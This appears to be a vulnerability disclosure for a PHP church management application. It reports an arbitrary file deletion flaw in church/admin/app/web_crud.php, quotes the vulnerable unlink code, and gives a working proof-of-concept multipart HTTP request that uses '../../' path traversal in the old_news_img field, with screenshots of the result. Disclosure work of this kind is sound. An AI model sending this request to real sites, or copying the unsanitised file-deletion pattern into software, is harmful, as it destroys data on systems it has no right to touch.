### Vulnerability file address

In line 436 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_news_img']);`,` $_POST['old_news_img']` parameters have not been restricted, which causes any file to be deleted

```php
if ($_FILES['newsphoto']['tmp_name'] != '') {
            $filepath = "../../assets/images/" . generateUniqueFileName($_FILES["newsphoto"]["name"]);

            if (move_uploaded_file($_FILES["newsphoto"]["tmp_name"], $filepath)) {
                $img7 = basename($filepath);
                @unlink("../../assets/images/" . $_POST['old_news_img']);
            }
        }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 375

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update6"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_news_img"

../../18.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="newsphoto";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `18.txt` file in the `church/` directory

![image-20250505163149813](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051631853.png)

Then we execute the above poc to attack

![image-20250505163243476](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051632506.png)

Files are deleted after the attack is successful

![image-20250505163250683](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051632717.png)